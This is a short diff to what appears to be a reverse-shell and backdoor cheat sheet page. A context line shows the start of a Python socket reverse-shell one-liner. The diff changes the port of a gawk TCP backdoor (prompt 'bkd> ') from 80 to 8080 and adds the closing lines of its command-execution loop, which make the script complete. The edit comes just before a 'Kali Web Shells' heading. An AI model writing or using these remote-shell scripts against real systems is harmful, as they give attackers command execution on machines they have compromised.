@@ -137,7 +137,7 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 #!/usr/bin/gawk -f
 
 BEGIN {
-        Port    =       80
+        Port    =       8080
         Prompt  =       "bkd> "
 
         Service = "/inet/tcp/" Port "/0/0"
@@ -149,6 +149,11 @@ BEGIN {
                                 while ((cmd |& getline) > 0)
                                         print $0 |& Service
                                 close(cmd)
+                        }
+                } while (cmd != "exit")
+                close(Service)
+        }
+}
 {% endhighlight %}
 
 ## Kali Web Shells 
